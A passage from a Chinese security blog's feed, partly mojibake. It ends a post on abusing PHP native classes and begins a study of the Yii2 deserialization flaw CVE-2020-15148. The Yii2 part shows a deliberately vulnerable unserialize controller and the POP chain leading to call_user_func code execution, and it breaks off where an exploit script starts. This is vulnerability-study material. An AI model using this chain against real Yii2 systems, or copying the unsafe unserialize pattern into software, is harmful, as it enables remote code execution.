class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">,</span><span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>ç›®å½•ä¸‹çš„<code>1.txt</code>å°†ä¼šè¢«åˆ é™¤</p><h3 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h3><p>æ³¨é‡Šè¯»å–</p><p><strong>range</strong>ï¼š<code>(PHP 5, PHP 7, PHP 8)</code></p><p>æ–¹æ³•å‚è€ƒï¼š<a href="https://www.php.net/manual/zh/book.reflection.php">https://www.php.net/manual/zh/book.reflection.php</a></p><p><strong>Example Class</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Apple</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$var1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$var2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Orange'</span><span class="token punctuation">;</span>    <span class="token comment">/**     * This is DocComment     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Apple'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åˆ©ç”¨phpåå°„ç±»æ¥è¿›è¡Œæ“ä½œ</p><p><code>ReflectionMethod</code>ç»§æ‰¿<code>ReflectionFunctionAbstract</code>è¿™ä¸ªæŠ½è±¡ç±»ï¼Œè¿™ä¸ªæŠ½è±¡ç±»å®ç°<code>Reflector</code>æ¥å£</p><p><code>ReflectionFunctionAbstract</code>ä¸­æœ‰ä¸€ä¸ª<code>getDocComment</code>æ–¹æ³•ï¼Œç”¨ä»¥è·å–å‡½æ•°çš„æ³¨é‡Šæ–‡æœ¬ï¼Œæ³¨é‡Šæ–‡æœ¬éœ€ç¬¦åˆ<code>/**</code>å¼€å¤´çš„è§„èŒƒå¦åˆ™æ— æ³•è¯†åˆ«</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$ref</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionMethod</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Apple"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ref</span><span class="token operator">-></span><span class="token function">getDocComment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"/**     * This is DocComment     */"</span></code></pre><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://www.cnblogs.com/bmjoker/p/13742666.html">phpååºåˆ—åŒ–ä»å…¥é—¨åˆ°æ”¾å¼ƒ(å…¥é—¨ç¯‡)</a></li><li><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">ååºåˆ—åŒ–ä¹‹PHPåŸç”Ÿç±»çš„åˆ©ç”¨</a></li><li><a href="https://www.anquanke.com/post/id/238482">PHP åŸç”Ÿç±»åœ¨ CTF ä¸­çš„åˆ©ç”¨</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Class-Found&quot;&gt;&lt;a href=&quot;#Class-Found&quot; class=&quot;headerlink&quot; title=&quot;Class Found&quot;&gt;&lt;/a&gt;Class Found&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;phpä¸­å«é­”æœ¯æ–¹æ³•çš„å†…ç½®ç±»&lt;/strong&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="å¤‡å¿˜å½•" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="xxe" scheme="https://www.extrader.top/tags/xxe/"/>
    
      <category term="ååºåˆ—åŒ–" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="ssrf" scheme="https://www.extrader.top/tags/ssrf/"/>
    
      <category term="xss" scheme="https://www.extrader.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Yii2ååºåˆ—åŒ–æ¼æ´(CVE-2020-15148)åˆ†æå­¦ä¹ </title>
    <link href="https://www.extrader.top/posts/c79847ee/"/>
    <id>https://www.extrader.top/posts/c79847ee/</id>
    <published>2021-05-13T13:22:30.000Z</published>
    <updated>2021-05-21T14:16:25.040Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Yii2ä»‹ç»"><a href="#Yii2ä»‹ç»" class="headerlink" title="Yii2ä»‹ç»"></a>Yii2ä»‹ç»</h3><p>Yii æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ï¼ŒåŸºäºç»„ä»¶çš„ PHP æ¡†æ¶ï¼Œç”¨äºå¿«é€Ÿå¼€å‘ç°ä»£ Web åº”ç”¨ç¨‹åºã€‚å³å¯ä»¥ç”¨äºå¼€å‘å„ç§ç”¨ PHP æ„å»ºçš„ Web åº”ç”¨ã€‚å› ä¸ºåŸºäºç»„ä»¶çš„æ¡†æ¶ç»“æ„å’Œè®¾è®¡ç²¾å·§çš„ç¼“å­˜æ”¯æŒï¼Œå®ƒç‰¹åˆ«é€‚åˆå¼€å‘å¤§å‹åº”ç”¨ï¼Œ å¦‚é—¨æˆ·ç½‘ç«™ã€ç¤¾åŒºã€å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ã€ ç”µå­å•†åŠ¡é¡¹ç›®å’Œ RESTful Web æœåŠ¡ç­‰ã€‚</p><h3 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h3><ul><li>Yii2 &lt; 2.0.38</li></ul><p>2.0.38å·²ä¿®å¤ï¼Œå®˜æ–¹ç»™<code>yii\db\BatchQueryResult</code>ç±»åŠ äº†ä¸€ä¸ª<code>__wakeup()</code>å‡½æ•°ï¼Œ<code>__wakeup</code>æ–¹æ³•åœ¨ç±»è¢«ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è¢«è°ƒç”¨ï¼Œè€Œè¿™é‡Œè¿™ä¹ˆå†™ï¼Œç›®çš„å°±æ˜¯åœ¨å½“BatchQueryResultç±»è¢«ååºåˆ—åŒ–æ—¶å°±ç›´æ¥æŠ¥é”™ï¼Œé¿å…ååºåˆ—åŒ–çš„å‘ç”Ÿï¼Œä¹Ÿå°±é¿å…äº†æ¼æ´ã€‚</p><ul><li><a href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99">https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99</a></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511165809784.png" alt loading="lazy"></p><h3 id="ç¯å¢ƒå¤ç°"><a href="#ç¯å¢ƒå¤ç°" class="headerlink" title="ç¯å¢ƒå¤ç°"></a>ç¯å¢ƒå¤ç°</h3><p>ç›´æ¥ä¸Š<code>github</code>å°†appä¸‹è½½ä¸‹æ¥è§£å‹</p><ul><li><a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a></li></ul><p>æœ¬åœ°webç¯å¢ƒä½¿ç”¨<code>phpstudy</code>é›†æˆç¯å¢ƒæ­å»ºï¼Œä½¿ç”¨<code>phpstorm</code>è¿›è¡Œ<code>xdebug</code>è°ƒè¯•</p><p>php versionï¼š7.4.3ntsï¼ŒApache versionï¼š2.4.39</p><p>ä¿®æ”¹<code>config\web.php</code>ä¸­çš„<code>cookieValidationKey</code>ä¸ºä»»æ„å€¼ï¼Œä½œä¸º<code>yii\web\Request::cookieValidationKey</code>çš„åŠ å¯†å€¼ï¼Œä¸è®¾ç½®ä¼šæŠ¥é”™</p><p>æ¥ç€è‡ªå·±æ·»åŠ ä¸€ä¸ª<code>controller</code>æ¥è¿›è¡Œæ¼æ´çš„åˆ©ç”¨ï¼Œåˆ›å»ºä¸€ä¸ªactionï¼š<a href="http://url/index.php?r=test/test">http://url/index.php?r=test/test</a>, controllersçš„å‘½åæ˜¯ï¼š <code>åç§°Controller</code>ï¼Œactionçš„å‘½åæ˜¯ï¼š <code>actionåç§°</code>ï¼Œå¦‚ä¸‹</p><p><code>controllers/TestController.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">TestController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">actionTest</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å‘åŒ…æµ‹è¯•ï¼Œç¯å¢ƒæ­å»ºæˆåŠŸ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511191942698.png" alt loading="lazy"></p><h3 id="CVEæ¼æ´åˆ†æ"><a href="#CVEæ¼æ´åˆ†æ" class="headerlink" title="CVEæ¼æ´åˆ†æ"></a>CVEæ¼æ´åˆ†æ</h3><h4 id="POP1"><a href="#POP1" class="headerlink" title="POP1"></a>POP1</h4><p>ä»<code>yii\db\BatchQueryResult</code>è¿™ä¸ªç±»å…¥æ‰‹ï¼Œæèµ·ä¸»è¦ä»£ç åˆ†æï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// make sure cursor is closed</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">!==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_batch</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_value</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_key</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>__destruct</code>è°ƒç”¨äº†<code>reset</code>æ–¹æ³•<code>reset</code>è°ƒç”¨äº†<code>close</code>æ–¹æ³•ï¼Œå‚æ•°<code>_dataReader</code>å¯æ§ï¼Œå­¦ä¹ æ€è·¯åçŸ¥é“è¿™é‡Œå¯ä»¥é€šè¿‡è§¦å‘<code>__call</code>æ–¹æ³•æ¥è¿›è¡Œåˆ©ç”¨</p><ul><li><code>__call</code>ï¼šå½“ä¸€ä¸ªå¯¹è±¡åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ </li></ul><p>å½“ä¸€ä¸ªå¯¹è±¡è°ƒç”¨ä¸å¯è®¿é—®çš„<code>close</code>æ–¹æ³•æˆ–è€…ç±»ä¸­å‹æ ¹å°±æ²¡æœ‰<code>close</code>æ–¹æ³•ï¼Œå³å¯è§¦å‘<code>__call</code>ï¼Œå…¨å±€æœç´¢<code>__call</code>æ–¹æ³•</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511200257237.png" alt loading="lazy"></p><p>æ‰¾åˆ°å…¶ä¸­ä¸€ä¸ª<code>Faker/Generator.php</code>ç±»ï¼Œè·Ÿè¿›æŸ¥çœ‹ä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">format</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getFormatter</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getFormatter</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">providers</span> <span class="token keyword">as</span> <span class="token variable">$provider</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$provider</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$provider</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>InvalidArgumentException</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unknown formatter "%s"'</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>__call</code>æ–¹æ³•è°ƒç”¨äº†ç±»ä¸­çš„<code>format</code>æ–¹æ³•ï¼Œ<code>format</code>æ–¹æ³•é‡Œçš„<code>call_user_func_array</code>é‡Œçš„å‚æ•°è°ƒç”¨äº†<code>getFormatter</code>æ–¹æ³•</p><ul><li><p><code>call_user_func_array</code>ï¼šè°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</p><p>å¤§è‡´ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">foobar</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token constant">__FUNCTION__</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">" got <span class="token interpolation"><span class="token variable">$arg</span></span> and <span class="token interpolation"><span class="token variable">$arg2</span></span>\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">foo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">bar</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token constant">__METHOD__</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">" got <span class="token interpolation"><span class="token variable">$arg</span></span> and <span class="token interpolation"><span class="token variable">$arg2</span></span>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Call the foobar() function with 2 arguments</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"foobar"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"one"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"two"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Call the $foo->bar() method with 2 arguments</span><span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$foo</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"bar"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"three"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"four"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></li></ul><p><code>getFormatter</code>æ–¹æ³•ä»<code>$this-&gt;$formatter</code>ä¸­å–å€¼ï¼Œ<code>$this-&gt;formatter</code>å¯æ§ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥è°ƒç”¨ä»»æ„ç±»ä¸­çš„ä»»æ„æ–¹æ³•äº†ã€‚Debugå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511203202841.png" alt loading="lazy"></p><p>ä½†æ˜¯<code>$arguments</code>æ˜¯ä»<code>yii\db\BatchQueryResult::reset()</code>é‡Œä¼ è¿‡æ¥çš„ï¼Œæˆ‘ä»¬ä¸å¯æ§ï¼Œæ¯”å¦‚è¿™é‡Œå°±ä¸ºç©ºï¼Œå› ä¸ºä¼ æ¥çš„<code>close</code>æ–¹æ³•ä¸­å‚å‚æ•°å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ä¸å¸¦å‚æ•°åœ°å»è°ƒç”¨åˆ«çš„ç±»ä¸­çš„æ–¹æ³•ã€‚</p><p>åˆ°è¿™ä¸€æ­¥å°±éœ€è¦ä¸€ä¸ªæ‰§è¡Œç±»ï¼Œè¿™æ—¶éœ€è¦ç±»ä¸­çš„æ–¹æ³•éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶</p><ol><li>æ–¹æ³•æ‰€éœ€çš„å‚æ•°åªèƒ½æ˜¯å…¶è‡ªå·±ç±»ä¸­å­˜åœ¨çš„ï¼ˆå³å‚æ•°ï¼š<code>$this-&gt;args</code>ï¼‰</li><li>æ–¹æ³•éœ€è¦æœ‰å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½</li></ol><p>é€šè¿‡å…¨å±€æŸ¥æ‰¾æ­£åˆ™åŒ¹é…<code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code>æ¥æŸ¥æ‰¾ï¼Œç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511203624162.png" alt loading="lazy"></p><ul><li><p><code>call_user_func</code>ï¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨,è¿™é‡Œç”¨<code>call_user_func</code>å³å¯è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœä¹Ÿå¯ä»¥è¾¾åˆ°<code>RCE</code>çš„æ•ˆæœ</p><p>å¤§è‡´ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">increment</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$var</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'increment'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'increment'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// You can use this instead before PHP 5.3</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></li></ul><p>å…¶ä¸­æœ‰ä¸¤ä¸ªç±»ä¸­çš„<code>run</code>æ–¹æ³•å¯ç”¨</p><ol><li><p><code>yii\rest\CreateAction::run()</code>ï¼Œ<code>$this-&gt;checkAccess, $this-&gt;id</code>ä¸¤ä¸ªå‚æ•°å¯æ§</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token operator">...</span><span class="token operator">...</span>        <span class="token keyword">return</span> <span class="token variable">$model</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>\yii\rest\IndexAction::run()</code>ï¼Œ<code>$this-&gt;checkAccess, $this-&gt;id</code>ä¸¤ä¸ªå‚æ•°å¯æ§</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">prepareDataProvider</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><p>äºæ˜¯å³å¯æ„é€ å®Œæ•´çš„<code>pop</code>é“¾</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>Generator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token operator">::</span><span class="token constant">run</span><span class="token operator">-></span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> 